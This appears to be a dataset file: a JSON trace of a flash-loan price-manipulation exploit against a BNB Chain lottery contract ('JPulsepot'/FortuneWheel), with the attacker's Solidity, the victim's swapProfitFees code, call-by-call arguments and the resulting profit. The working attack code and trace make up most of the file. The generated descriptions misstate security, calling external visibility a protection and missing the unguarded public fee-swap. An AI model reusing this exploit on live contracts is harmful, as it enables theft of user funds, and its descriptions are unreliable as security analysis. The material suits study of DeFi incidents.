@@ -1,0 +1,541 @@
+[
+    {
+        "id": "23756",
+        "args": "",
+        "original_code": "    function testExploit() public balanceLog {\n        //implement exploit code here\n        address recipient = address(this);\n        uint256 amount0 = 0;\n        uint256 amount1 = 4_300_000_000_000_000_000_000;\n        bytes memory data = abi.encode(amount1);\n        IPancakeV3Pool(PancakeV3Pool).flash(recipient, amount0, amount1, data);\n    }\n\n",
+        "description": "1. **Core function**:  \n   The `testExploit` function is designed to simulate or execute an exploit scenario. It interacts with a PancakeV3Pool contract by calling its `flash` function. The purpose of this function is to trigger a specific behavior in the pool, likely to test or exploit a vulnerability or feature related to flash loans or liquidity operations.\n\n2. **Security mechanism**:  \n   The function uses the `balanceLog` modifier, which likely logs or tracks balance changes to ensure transparency or security during the execution. This modifier acts as a defense measure to monitor the state of the contract or account balances before and after the function runs. Additionally, the function does not directly handle funds but relies on the `flash` function of the PancakeV3Pool, which may have its own security checks.\n\n3. **Parameter Function**:  \n   - `recipient`: This is set to `address(this)`, meaning the current contract will receive the funds or data from the `flash` function.  \n   - `amount0`: Set to `0`, indicating no transfer of the first token type.  \n   - `amount1`: Set to a very large number (`4_300_000_000_000_000_000_000`), representing a significant amount of the second token type to be involved in the operation.  \n   - `data`: Encodes `amount1` into a byte array, which is likely passed to the `flash` function for additional context or instructions.  \n\n4. **Return description**:  \n   The function does not explicitly return any value. Its primary purpose is to execute the `flash` function of the PancakeV3Pool contract, which may perform internal calculations or state changes. The result of this operation depends on the logic of the `flash` function in the PancakeV3Pool contract.  \n\n**In summary**, the `testExploit` function is a test or exploit simulation that interacts with a PancakeV3Pool contract using a flash loan mechanism. It uses a modifier for balance tracking and passes specific parameters to the `flash` function to trigger a particular behavior. The function does not return a value but relies on the external contract's logic for its outcome.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "921668",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3264",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"WBNB\""
+    },
+    {
+        "id": "2534",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2444",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "874244",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 4300000000000000000000 [4.3e21], 0x0000000000000000000000000000000000000000000000e91a7cd19fa3b00000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2531",
+        "args": "0x172fcD41E0913e95784454622d1c3724f546f849",
+        "original_code": null,
+        "description": null,
+        "return_value": "3178686471569296579127296 [3.178e24]"
+    },
+    {
+        "id": "2534",
+        "args": "0x172fcD41E0913e95784454622d1c3724f546f849",
+        "original_code": null,
+        "description": null,
+        "return_value": "4478385724514701387203 [4.478e21]"
+    },
+    {
+        "id": "25962",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4300000000000000000000 [4.3e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "812373",
+        "args": "0, 430000000000000000 [4.3e17], 0x0000000000000000000000000000000000000000000000e91a7cd19fa3b00000",
+        "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {\n        uint256 amount = abi.decode(data, (uint256));\n\n        IERC20(BNB).approve(PancakeV2Router, type(uint256).max);\n\n        uint256 amountIn = amount;\n        uint256 amonutOutMin = 0;\n        address[] memory path = new address[](2);\n        path[0] = BNB;\n        path[1] = LINK;\n        address recipient = address(this);\n        uint256 deadline = block.timestamp;\n        IUniswapV2Router(payable(PancakeV2Router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, amonutOutMin, path, recipient, deadline);\n        \n        IFortuneWheel(victim).swapProfitFees();\n\n        IERC20(LINK).approve(PancakeV2Router, type(uint256).max);\n\n        amountIn = IERC20(LINK).balanceOf(address(this));\n        path[0] = LINK;\n        path[1] = BNB;\n        IUniswapV2Router(payable(PancakeV2Router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, recipient, deadline);\n        IERC20(BNB).transfer(msg.sender, amount+fee1);\n    }\n\n",
+        "description": "1. Core functions:  \nThis function is designed to handle a specific type of transaction called a \"flash callback\" in a decentralized finance (DeFi) environment. It performs a series of steps to swap tokens on a decentralized exchange (DEX) called PancakeSwap. First, it decodes an amount from the provided data and approves the maximum possible amount of BNB tokens for use in the transaction. Then, it swaps BNB tokens for LINK tokens. After that, it interacts with another contract (victim) to process profit fees. Finally, it swaps the LINK tokens back to BNB and transfers the original amount plus a fee to the caller.\n\n2. Security mechanism:  \nThe function uses `external` to ensure it can only be called from outside the contract. It also uses `approve` with `type(uint256).max` to grant maximum allowance for token transfers, which reduces the need for repeated approvals. However, this approach could be risky if the contract is compromised. The function also relies on the `msg.sender` to ensure the correct recipient receives the final transfer. There are no explicit access controls or checks for reentrancy, which could be a security concern.\n\n3. Parameter Function:  \n- `fee0` and `fee1`: These represent fees associated with the transaction, though only `fee1` is used in the final transfer.  \n- `data`: This contains encoded information, specifically the amount of tokens involved in the transaction.  \nThese parameters are essential for calculating the amounts to be swapped and transferred.\n\n4. Return description:  \nThe function does not return any value directly. Instead, it performs token swaps and transfers. The final output is the transfer of the original amount plus `fee1` in BNB tokens to the caller (`msg.sender`). The logic ensures that the caller receives the expected amount after all swaps and fee processing.\n\nIn summary,  \nThis function handles a flash callback by swapping tokens, processing fees, and returning the result to the caller. It uses basic security measures like `external` and `approve` but lacks advanced protections like reentrancy guards. The parameters provide necessary data for the swaps and transfers, and the final output is a transfer of tokens to the caller.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "24420",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "89204",
+        "args": "4300000000000000000000 [4.3e21], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD], JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1736501998 [1.736e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8225",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x824eb9faDFb377394430d2744fa7C42916DE3eCe, 4300000000000000000000 [4.3e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2531",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "575059722221790815001 [5.75e20], 19683020234934991242367 [1.968e22], 1736501716 [1.736e9]"
+    },
+    {
+        "id": "534",
+        "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
+        "original_code": null,
+        "description": null,
+        "return_value": "4875059722221790815001 [4.875e21]"
+    },
+    {
+        "id": "62348",
+        "args": "0, 17356089427655381925726 [1.735e22], JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "27971",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17356089427655381925726 [1.735e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
+        "original_code": null,
+        "description": null,
+        "return_value": "4875059722221790815001 [4.875e21]"
+    },
+    {
+        "id": "531",
+        "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
+        "original_code": null,
+        "description": null,
+        "return_value": "2326930807279609316641 [2.326e21]"
+    },
+    {
+        "id": "531",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "17356089427655381925726 [1.735e22]"
+    },
+    {
+        "id": "602045",
+        "args": "",
+        "original_code": "    function swapProfitFees() external {\n        IPancakeRouter02 router = IPancakeRouter02(pancakeRouterAddr);\n        address[] memory path = new address[](2);\n        uint256 totalBNBForGame;\n        uint256 totalBNBForLink;\n        uint256 length = casinoCount;\n        uint256 BNBPPool = 0;\n\n        // Swap each token to BNB\n        for (uint256 i = 1; i <= length; ++i) {\n            Casino memory casinoInfo = tokenIdToCasino[i];\n            IERC20 token = IERC20(casinoInfo.tokenAddress);\n\n            if (casinoInfo.liquidity == 0) continue;\n\n            uint256 availableProfit = casinoInfo.profit < 0 ? 0 : uint256(casinoInfo.profit);\n            if (casinoInfo.liquidity < availableProfit) {\n                availableProfit = casinoInfo.liquidity;\n            }\n\n            uint256 gameFee = (availableProfit * casinoInfo.fee) / 100;\n            uint256 amountForLinkFee = getTokenAmountForLink(casinoInfo.tokenAddress, linkSpent[i]);\n            _updateProfitInfo(i, uint256(gameFee), availableProfit);\n            casinoInfo.liquidity = tokenIdToCasino[i].liquidity;\n\n            // If fee from the profit is not enought for link, then use liquidity\n            if (gameFee < amountForLinkFee) {\n                if (casinoInfo.liquidity < (amountForLinkFee - gameFee)) {\n                    amountForLinkFee = gameFee + casinoInfo.liquidity;\n                    tokenIdToCasino[i].liquidity = 0;\n                } else {\n                    tokenIdToCasino[i].liquidity -= (amountForLinkFee - gameFee);\n                }\n                gameFee = 0;\n            } else {\n                gameFee -= amountForLinkFee;\n            }\n\n            // Update Link consumption info\n            _updateLinkConsumptionInfo(i, amountForLinkFee);\n\n            if (casinoInfo.tokenAddress == address(0)) {\n                totalBNBForGame += gameFee;\n                totalBNBForLink += amountForLinkFee;\n                continue;\n            }\n            if (casinoInfo.tokenAddress == BNBPAddress) {\n                BNBPPool += gameFee;\n                gameFee = 0;\n            }\n\n            path[0] = casinoInfo.tokenAddress;\n            path[1] = wbnbAddr;\n\n            if (gameFee + amountForLinkFee == 0) {\n                continue;\n            }\n            token.approve(address(router), gameFee + amountForLinkFee);\n            uint256[] memory swappedAmounts = router.swapExactTokensForETH(\n                gameFee + amountForLinkFee,\n                0,\n                path,\n                address(this),\n                block.timestamp\n            );\n            totalBNBForGame += (swappedAmounts[1] * gameFee) / (gameFee + amountForLinkFee);\n            totalBNBForLink += (swappedAmounts[1] * amountForLinkFee) / (gameFee + amountForLinkFee);\n        }\n\n        path[0] = wbnbAddr;\n        // Convert to LINK\n        if (totalBNBForLink > 0) {\n            path[1] = linkTokenAddr;\n\n            // Swap BNB into Link Token\n            uint256 linkAmount = router.swapExactETHForTokens{ value: totalBNBForLink }(\n                0,\n                path,\n                address(this),\n                block.timestamp\n            )[1];\n\n            // Convert Link to ERC677 Link\n            IERC20(linkTokenAddr).approve(pegSwapAddr, linkAmount);\n            PegSwap(pegSwapAddr).swap(linkAmount, linkTokenAddr, link677TokenAddr);\n\n            // Fund VRF subscription account\n            LinkTokenInterface(link677TokenAddr).transferAndCall(\n                coordinatorAddr,\n                linkAmount,\n                abi.encode(subscriptionId)\n            );\n            emit SuppliedLink(linkAmount);\n        }\n\n        // Swap the rest of BNB to BNBP\n        if (totalBNBForGame > 0) {\n            path[1] = BNBPAddress;\n            BNBPPool += router.swapExactETHForTokens{ value: totalBNBForGame }(0, path, address(this), block.timestamp)[\n                1\n            ];\n        }\n\n        if (BNBPPool > 0) {\n            // add BNBP to tokenomics pool\n            IERC20(BNBPAddress).approve(potAddress, BNBPPool);\n            IPotLottery(potAddress).addAdminTokenValue(BNBPPool);\n\n            emit SuppliedBNBP(BNBPPool);\n        }\n    }\n\n    receive() external payable {}\n}\n",
+        "description": "1. **Core functions**:  \n   The `swapProfitFees` function is designed to handle the conversion of profits and fees from various tokens into BNB (Binance Coin) and then further into other specific tokens like LINK and BNBP. It processes each casino's profit, calculates the fees, and ensures that the necessary amounts are allocated for game fees and LINK token fees. The function also swaps these amounts into BNB and then converts them into the required tokens, distributing them to their respective destinations (e.g., funding a VRF subscription account or adding to a tokenomics pool).\n\n2. **Security mechanism**:  \n   - The function uses `external` visibility, meaning it can only be called from outside the contract, ensuring controlled access.  \n   - It checks for sufficient liquidity and adjusts the amounts to be swapped if necessary, preventing errors or overspending.  \n   - The function uses `approve` to grant permission for token transfers, ensuring that only the required amounts are moved.  \n   - It includes checks to ensure that the amounts being swapped are not zero, avoiding unnecessary transactions.  \n   - The `receive` function allows the contract to accept BNB payments, ensuring compatibility with BNB transfers.  \n\n3. **Parameter Function**:  \n   The function does not take any explicit parameters. However, it relies on internal state variables like `pancakeRouterAddr`, `casinoCount`, `tokenIdToCasino`, and others to perform its operations. These variables provide the necessary context, such as the addresses of tokens, routers, and casinos, as well as the counts and details of each casino's liquidity and profits.\n\n4. **Return description**:  \n   The function does not return any value. Instead, it performs a series of actions: swapping tokens into BNB, converting BNB into LINK and BNBP, and distributing these tokens to their respective destinations. The results of these actions are emitted as events (`SuppliedLink` and `SuppliedBNBP`) to provide transparency about the amounts processed and distributed.\n\n**In summary**, the `swapProfitFees` function manages the conversion and distribution of profits and fees from multiple casinos into BNB and other tokens. It ensures that the correct amounts are allocated for game fees and LINK token fees, swaps these amounts into BNB, and then converts them into the required tokens for further use. The function includes security measures to prevent errors and unauthorized access, and it emits events to track the distribution of tokens.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "5151",
+        "args": "48090000000000000000 [4.809e19], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[103135416163530787817 [1.031e20], 48090000000000000000 [4.809e19]]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4875059722221790815001 [4.875e21], 2326930807279609316641 [2.326e21], 1736501998 [1.736e9]"
+    },
+    {
+        "id": "5111",
+        "args": "17600400000000000000 [1.76e19], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[17600400000000000000 [1.76e19], 8349832622427605647 [8.349e18]]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4875059722221790815001 [4.875e21], 2326930807279609316641 [2.326e21], 1736501998 [1.736e9]"
+    },
+    {
+        "id": "13631",
+        "args": "22020000000000000000 [2.202e19], [0x4D9927a8Dc4432B93445dA94E4084D292438931F, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[217902307222553107209870 [2.179e23], 46690682950839373836 [4.669e19], 22020000000000000000 [2.202e19]]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4875059722221790815001 [4.875e21], 2326930807279609316641 [2.326e21], 1736501998 [1.736e9]"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "121263025417142429893090 [1.212e23], 72739253315769478301 [7.273e19], 1736491495 [1.736e9]"
+    },
+    {
+        "id": "9035",
+        "args": "36597855250000000000000 [3.659e22], [0x4D9927a8Dc4432B93445dA94E4084D292438931F, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[36597855250000000000000 [3.659e22], 16831183026189930161 [1.683e19], 7986159668894686738 [7.986e18]]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "121263025417142429893090 [1.212e23], 72739253315769478301 [7.273e19], 1736491495 [1.736e9]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4875059722221790815001 [4.875e21], 2326930807279609316641 [2.326e21], 1736501998 [1.736e9]"
+    },
+    {
+        "id": "24596",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 36597855250000000000000 [3.659e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "119455",
+        "args": "36597855250000000000000 [3.659e22], 0, [0x4D9927a8Dc4432B93445dA94E4084D292438931F, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x384b9fb6E42dab87F3023D87ea1575499A69998E, 1736501998 [1.736e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[36597855250000000000000 [3.659e22], 16831183026189930161 [1.683e19]]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "121263025417142429893090 [1.212e23], 72739253315769478301 [7.273e19], 1736491495 [1.736e9]"
+    },
+    {
+        "id": "28303",
+        "args": "0x384b9fb6E42dab87F3023D87ea1575499A69998E, 0x4C736d24d72D874cc2465553500c1Ff3Fc7b3BDA, 36597855250000000000000 [3.659e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2676",
+        "args": "0x4D9927a8Dc4432B93445dA94E4084D292438931F, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x4C736d24d72D874cc2465553500c1Ff3Fc7b3BDA"
+    },
+    {
+        "id": "64816",
+        "args": "0, 16831183026189930161 [1.683e19], 0x10ED43C718714eb63d5aA57B78B54704E256024E, 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "29962",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 16831183026189930161 [1.683e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1008",
+        "args": "0x4C736d24d72D874cc2465553500c1Ff3Fc7b3BDA",
+        "original_code": null,
+        "description": null,
+        "return_value": "157860880667142429893090 [1.578e23]"
+    },
+    {
+        "id": "534",
+        "args": "0x4C736d24d72D874cc2465553500c1Ff3Fc7b3BDA",
+        "original_code": null,
+        "description": null,
+        "return_value": "55908070289579548140 [5.59e19]"
+    },
+    {
+        "id": "9223",
+        "args": "16831183026189930161 [1.683e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "83",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "55",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "81228",
+        "args": "0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD], 0x384b9fb6E42dab87F3023D87ea1575499A69998E, 1736501998 [1.736e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[34431583026189930161 [3.443e19], 16278878565747828785 [1.627e19]]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4875059722221790815001 [4.875e21], 2326930807279609316641 [2.326e21], 1736501998 [1.736e9]"
+    },
+    {
+        "id": "21974",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3262",
+        "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe, 34431583026189930161 [3.443e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "40264",
+        "args": "0, 16278878565747828785 [1.627e19], 0x384b9fb6E42dab87F3023D87ea1575499A69998E, 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "25171",
+        "args": "0x384b9fb6E42dab87F3023D87ea1575499A69998E, 16278878565747828785 [1.627e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
+        "original_code": null,
+        "description": null,
+        "return_value": "4909491305247980745162 [4.909e21]"
+    },
+    {
+        "id": "531",
+        "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
+        "original_code": null,
+        "description": null,
+        "return_value": "2310651928713861487856 [2.31e21]"
+    },
+    {
+        "id": "24562",
+        "args": "0x1FCc3B22955e76Ca48bF025f1A6993685975Bb9e, 16278878565747828785 [1.627e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "67053",
+        "args": "16278878565747828785 [1.627e19], 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD, 0x404460C6A5EdE2D891e8297795264fDe62ADBB75",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "10834",
+        "args": "0x384b9fb6E42dab87F3023D87ea1575499A69998E, 0x1FCc3B22955e76Ca48bF025f1A6993685975Bb9e, 16278878565747828785 [1.627e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "30445",
+        "args": "0x384b9fb6E42dab87F3023D87ea1575499A69998E, 16278878565747828785 [1.627e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "32995",
+        "args": "0xc587d9053cd1118f25F645F9E08BB98c9712A4EE, 16278878565747828785 [1.627e19], 0x00000000000000000000000000000000000000000000000000000000000002a3",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "17758",
+        "args": "0x384b9fb6E42dab87F3023D87ea1575499A69998E, 16278878565747828785 [1.627e19], 0x00000000000000000000000000000000000000000000000000000000000002a3",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "24562",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "17356089427655381925726 [1.735e22]"
+    },
+    {
+        "id": "53973",
+        "args": "17356089427655381925726 [1.735e22], 0, [0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1736501998 [1.736e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6034",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x824eb9faDFb377394430d2744fa7C42916DE3eCe, 17356089427655381925726 [1.735e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4909491305247980745162 [4.909e21], 2310651928713861487856 [2.31e21], 1736501998 [1.736e9]"
+    },
+    {
+        "id": "531",
+        "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
+        "original_code": null,
+        "description": null,
+        "return_value": "19666741356369243413582 [1.966e22]"
+    },
+    {
+        "id": "38255",
+        "args": "4331398120414037532669 [4.331e21], 0, JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23162",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4331398120414037532669 [4.331e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
+        "original_code": null,
+        "description": null,
+        "return_value": "578093184833943212493 [5.78e20]"
+    },
+    {
+        "id": "531",
+        "args": "0x824eb9faDFb377394430d2744fa7C42916DE3eCe",
+        "original_code": null,
+        "description": null,
+        "return_value": "19666741356369243413582 [1.966e22]"
+    },
+    {
+        "id": "534",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4331398120414037532669 [4.331e21]"
+    },
+    {
+        "id": "3262",
+        "args": "0x172fcD41E0913e95784454622d1c3724f546f849, 4300430000000000000000 [4.3e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "0x172fcD41E0913e95784454622d1c3724f546f849",
+        "original_code": null,
+        "description": null,
+        "return_value": "3178686471569296579127296 [3.178e24]"
+    },
+    {
+        "id": "534",
+        "args": "0x172fcD41E0913e95784454622d1c3724f546f849",
+        "original_code": null,
+        "description": null,
+        "return_value": "4478815724514701387203 [4.478e21]"
+    },
+    {
+        "id": "1264",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"WBNB\""
+    },
+    {
+        "id": "534",
+        "args": "JPulsepot: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "30968120414037532669 [3.096e19]"
+    },
+    {
+        "id": "444",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    }
+]
